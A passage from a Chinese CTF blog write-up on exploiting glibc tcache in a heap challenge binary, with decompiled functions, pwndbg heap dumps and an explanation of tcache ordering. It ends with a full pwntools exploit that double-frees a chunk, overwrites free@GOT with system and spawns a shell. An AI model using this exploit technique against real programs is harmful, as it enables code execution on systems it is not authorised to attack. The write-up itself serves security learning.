class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Error: Invalid index!\n&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里可以看到漏洞点，free指针后没有清零</p>
<h2 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+0h] [rbp-10h]</span><br><span class="line">  int v2; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;Which one do you want to modify?&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( (v1 &amp; 0x80000000) == 0 &amp;&amp; v1 &lt;= 0xF &amp;&amp; ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;What size is the point?&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v2);</span><br><span class="line">    read(0, (void *)ptr[v1], v2);</span><br><span class="line">    puts(&quot;Success!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Error: Invalid index!\n&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>edit函数可以方便我们进行漏洞利用从而进行任意地址malloc</p>
<h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 show()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;Which one do you want to see?&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( (v1 &amp; 0x80000000) == 0 &amp;&amp; v1 &lt;= 0xF &amp;&amp; ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts((const char *)ptr[v1]);</span><br><span class="line">    puts(&quot;Success!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Error: Invalid index!\n&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>show函数方便我们进行地址泄露</p>
<p>##　利用分析</p>
<p>下面的内容就很明了了,但首先我们先抛开如何解这道题，我们先来看看tcache的一些小机制</p>
<h3 id="tcache机制"><a href="#tcache机制" class="headerlink" title="tcache机制"></a>tcache机制</h3><p>先用gdb加载程序，然后在main函数处下断点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nightrain@root-pwn-me:~/pwn/tcache/tcache$ gdb ./tcache</span><br><span class="line">pwndbg&gt; b main</span><br><span class="line">Breakpoint 1 at 0x400b2b</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure></p>
<p>好了，然后让我们把程序跑起来，我们先分配两个大小为３２的堆块然后按照０，１的顺序ｆｒｅｅ掉他们<br>也就是add两次，free两次</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 593, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603250 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 49, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603280 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 49, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6032b0 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 134481, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时堆块如上，可以看到我们get了两个大小为49的chunk，为什么是49呢，因为是64位，要和１６对齐，而因为我们申请的大小为３２，此时size+8为40，向１６位对齐为４８，再加上１位标志位，就成了４９,地址内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32 0x603250</span><br><span class="line">0x603250:	0x00000000	0x00000000	0x00000031	0x00000000</span><br><span class="line">0x603260:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x603270:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x603280:	0x00000000	0x00000000	0x00000031	0x00000000</span><br><span class="line">0x603290:	0x00603260	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x6032a0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x6032b0:	0x00000000	0x00000000	0x00020d51	0x00000000</span><br><span class="line">0x6032c0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
<p>然后我们依次free掉这两个chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x30 [  2]: 0x603290 —▸ 0x603260 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>我们就得到了两个tcache chunk,其中不难看出0x603260为第０个chunk,然后我们再申请一次大小为３２的chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x30 [  1]: 0x603260 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>这里可以看到我们将第1个tcache先拿出去了，这里就是tcache的一个小机制了，tcache是先进后出</p>
<h3 id="tcache的一些小利用例子"><a href="#tcache的一些小利用例子" class="headerlink" title="tcache的一些小利用例子"></a>tcache的一些小利用例子</h3><p>为了避免造轮子，大家可以直接看<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/" target="_blank" rel="noopener">ctf-wiki</a></p>
<h3 id="本题解法"><a href="#本题解法" class="headerlink" title="本题解法"></a>本题解法</h3><p>上面列举了一小点tcache的机制，下面开始对本题进行求解<br>本题我采用修改free@got为system函数来进行求解，当然，泄露libc基址的办法有很多，我们可以申请unsorted bin来泄露，而因为本题使用了tcache机制，因此我们采用double free的方式进行泄露<br>这里我们先写了菜单：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def add(size):</span><br><span class="line">    p.sendlineafter(&apos;Your choice?&apos;,&apos;1&apos;)</span><br><span class="line">    p.sendlineafter(&apos;What size do you want?&apos;,str(size))</span><br><span class="line"></span><br><span class="line">def edit(num,size,buf):</span><br><span class="line">    p.sendlineafter(&apos;Your choice?&apos;,&apos;3&apos;)</span><br><span class="line">    log.success(&apos;[*]choice3&apos;)</span><br><span class="line">    p.sendlineafter(&apos;Which one do you want to modify?&apos;,str(num))</span><br><span class="line">    log.success(&apos;[*]str&apos;)</span><br><span class="line">    p.sendlineafter(&apos;What size is the point?&apos;,str(size))</span><br><span class="line">    log.success(&apos;[*]256&apos;)</span><br><span class="line">    p.send(buf)</span><br><span class="line"></span><br><span class="line">def show(num):</span><br><span class="line">    p.sendlineafter(&apos;Your choice?&apos;,&apos;4&apos;)</span><br><span class="line">    p.sendlineafter(&apos;Which one do you want to see?&apos;,str(num))</span><br><span class="line"></span><br><span class="line">def dele(num):</span><br><span class="line">    p.sendlineafter(&apos;Your choice?&apos;,&apos;2&apos;)</span><br><span class="line">    p.sendlineafter(&apos;Which one do you want to delete?&apos;,str(num))</span><br></pre></td></tr></table></figure>
<p>然后我们利用double free来进行libc的泄露<br>步骤如下：add(24) -&gt; dele(0) -&gt; dele(0) -&gt; add(24) -&gt; add(24) -&gt; show(2)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  1]: 0x602018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7fab79c65950 (free) ◂— ...</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>在dele后我停了一下，此时tcache的next指针已经指向了free函数，我们只需要再申请两次chunk然后直接进行打印就可以得到free的地址，然后减去free@got的地址就可以直接得到libc的基址<br>此时我们可以提前把id为１的chunk块内容改成/bin/sh，最后只要把free函数改成system函数，然后dele(1)就可以get shell了，exp如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.word_size = 64</span><br><span class="line">context.os = &quot;linux&quot;</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">#context.log_level=&quot;debug&quot;</span><br><span class="line">p=process(&apos;./tcache&apos;)</span><br><span class="line">#p=remote(&apos;eonew.cn&apos;, 60109)</span><br><span class="line">elf=ELF(&apos;./tcache&apos;)</span><br><span class="line">libc=ELF(&apos;./libc-2.27.so&apos;)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    f = open(&apos;pid&apos;, &apos;w&apos;)</span><br><span class="line">    f.write(str(proc.pidof(p)[0]))</span><br><span class="line">    f.close()</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(e)</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    p.sendlineafter(&apos;Your choice?&apos;,&apos;1&apos;)</span><br><span class="line">    p.sendlineafter(&apos;What size do you want?&apos;,str(size))</span><br><span class="line"></span><br><span class="line">def edit(num,size,buf):</span><br><span class="line">    p.sendlineafter(&apos;Your choice?&apos;,&apos;3&apos;)</span><br><span class="line">    log.success(&apos;[*]choice3&apos;)</span><br><span class="line">    p.sendlineafter(&apos;Which one do you want to modify?&apos;,str(num))</span><br><span class="line">    log.success(&apos;[*]str&apos;)</span><br><span class="line">    p.sendlineafter(&apos;What size is the point?&apos;,str(size))</span><br><span class="line">    log.success(&apos;[*]256&apos;)</span><br><span class="line">    p.send(buf)</span><br><span class="line"></span><br><span class="line">def show(num):</span><br><span class="line">    p.sendlineafter(&apos;Your choice?&apos;,&apos;4&apos;)</span><br><span class="line">    p.sendlineafter(&apos;Which one do you want to see?&apos;,str(num))</span><br><span class="line"></span><br><span class="line">def dele(num):</span><br><span class="line">    p.sendlineafter(&apos;Your choice?&apos;,&apos;2&apos;)</span><br><span class="line">    p.sendlineafter(&apos;Which one do you want to delete?&apos;,str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#pause()</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(24)</span><br><span class="line">dele(0)</span><br><span class="line">dele(0)</span><br><span class="line">#pause()</span><br><span class="line">edit(0,24,p64(elf.got[&apos;free&apos;]))</span><br><span class="line">add(24)</span><br><span class="line">#pause()</span><br><span class="line">edit(1,24,&apos;/bin/sh\0&apos;)</span><br><span class="line">#pause()</span><br><span class="line">add(24)</span><br><span class="line">show(2)</span><br><span class="line">p.recvuntil(&apos;\n&apos;)</span><br><span class="line">result=u64(p.recvuntil(&apos;\n&apos;)[:-1].ljust(8,chr(0)))</span><br><span class="line">libc_base=result-libc.symbols[&apos;free&apos;]</span><br><span class="line">log.success(&apos;[*]libc_free:&apos;+hex(result))</span><br><span class="line">log.success(&apos;[*]libc_base:&apos;+hex(libc_base))</span><br><span class="line">sys_addr=libc_base+libc.symbols[&apos;system&apos;]</span><br><span class="line">log.success(&apos;[*]system:&apos;+hex(sys_addr))</span><br><span class="line">edit(2,24,p64(sys_addr))</span><br><span class="line">sleep(1)</span><br><span class="line">dele(1)</span><br><span class="line">p.interactive()</span><br><span class="line">os.system(&quot;rm -f pid&quot;)</span><br></pre></td></tr></table></figure>

          </div>
          
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2019-07-12T06:07:53.514Z" itemprop="dateUpdated">2019-07-12 14:07:53</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/2019/07/11/tcache-md/" target="_blank" rel="external">https://nightRainy.github.io/2019/07/11/tcache-md/</a>
        
    </div>
    <footer>
        <a href="https://nightRainy.github.io">
            <img src="/img/favicon.jpg" alt="nightRainy">
            nightRainy
        </a>
    </footer>
</blockquote>

          
          
          <div class="post-footer">
              
              <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://nightRainy.github.io/2019/07/11/tcache-md/&title=《tcache.md》 — NightRainy's Blog&pic=https://nightRainy.github.io/img/favicon.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://nightRainy.github.io/2019/07/11/tcache-md/&title=《tcache.md》 — NightRainy's Blog&source=my blogs" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

          </div>
          
              


          
      </div>
      
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/2019/07/17/ret2-dl-runtime-resolve/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">ret2_dl_runtime_resolve</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/2019/07/11/tcache机制利用学习/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">tcache.md</h4>
      </a>
    </div>
  
</nav>


      
      
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#代码分析"><span class="post-toc-number">1.</span> <span class="post-toc-text">代码分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#malloc-c"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">malloc.c</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#定义"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">定义</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#结构体"><span class="post-toc-number">1.1.2.</span> <span class="post-toc-text">结构体</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#两个新定义的函数-tcache-get-和tcache-put"><span class="post-toc-number">1.1.3.</span> <span class="post-toc-text">两个新定义的函数(tcache_get 和tcache_put)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#tcache-thread-freeres"><span class="post-toc-number">1.1.4.</span> <span class="post-toc-text">tcache_thread_freeres</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#tcache-init"><span class="post-toc-number">1.1.5.</span> <span class="post-toc-text">tcache_init_</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#int-malloc"><span class="post-toc-number">1.1.6.</span> <span class="post-toc-text">_int_malloc</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#init-free"><span class="post-toc-number">1.1.7.</span> <span class="post-toc-text">_init_free</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#总结"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">总结</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#利用姿势"><span class="post-toc-number">2.</span> <span class="post-toc-text">利用姿势</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#mian函数"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">mian函数</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#add"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">add()</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#delete"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">delete</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#edit"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">edit</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#show"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">show</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#tcache机制"><span class="post-toc-number">2.5.1.</span> <span class="post-toc-text">tcache机制</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#tcache的一些小利用例子"><span class="post-toc-number">2.5.2.</span> <span class="post-toc-text">tcache的一些小利用例子</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#本题解法"><span class="post-toc-number">2.5.3.</span> <span class="post-toc-text">本题解法</span></a></li></ol></li></ol></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </div></div></aside>
    
  </article>
  
  
</div>

        <footer class="footer">
    
    <div class="bottom">
        <p>
            <span>
                nightRainy &copy; 2017 - 2019
            </span>
        		
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            

            
                
<span class="site-uv" title="总访客量">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="总访问量">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://nightRainy.github.io/2019/07/11/tcache-md/&title=《tcache.md》 — NightRainy's Blog&pic=https://nightRainy.github.io/img/favicon.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://nightRainy.github.io/2019/07/11/tcache-md/&title=《tcache.md》 — NightRainy's Blog&source=my blogs" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACMElEQVR42u3aS47CQAxF0ex/0+lpS03CfXZAXa6bEYIg6mRg/DsOfJ2/rqtP7++/uufv/Ve/8sAlQ4aMZRnn7XV/T/9B3IPJ2WTIkLEP4z6MknDJQzN/QDzEy5AhQwZJ41IY/64MGTJk1Bj3ySUJrwQsQ4YMGWkRW0vm0sL447W4DBkyFmTwZtn3X39kviFDhoylGGd4pcVqmhoWTyVDhozRDB7gSNKWNuk6yxYyZMjYh/HsgkXtWOkI4cU7MmTIGM1IW1rkfT6qTB/BG7AMGTKGMuJCEQdKEkZJSEXfkiFDxmhGrRyttcl4ulkL+jJkyJjKICE1HRUEfb72qqsMGTJ2Y/DhIl/CSI9OwuuL1zJkyBjNSA/UXxfjRSwfoMqQIWMHRtpiI0Vp2oBDQ8q0FpchQ8YIBk/s+BpErT2XLlvE/xUyZMhYlpEGu/ToD0wteGNOhgwZQxkk5PHEMYU9dr8MGTK2YfAUrdbKrxWxaBVDhgwZoxl8tSIdBtTCd9rmQxmoDBkyRjDS8Jc24HiAThfCLkeYMmTIGMpIw1x/5as2rngTcGXIkLElg6d0hB1nrHzAIEOGjKGMM7yeKk37DyWov2XIkLE4Ix0WpmsWtaPUQrYMGTJmM3iQ5QftrGuQO2XIkLEngwe+Tnr3L2pxGTJkbMzorFykyeiR5qcyZMjYjJEmghzfGovKkCFjA0ZtGMA/rQXuj7TbZMiQsSCjtqpVa6v1W3itoaYMGTLWY/wAzFLmVCBqZkcAAAAASUVORK5CYII=" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.1"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.1"></script>
<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>

<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.4.1"></script>
<script type="text/javascript" src="/js/blog.js?v=1.4.1"></script>

<!-- third-party -->






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.1"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
    





    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>



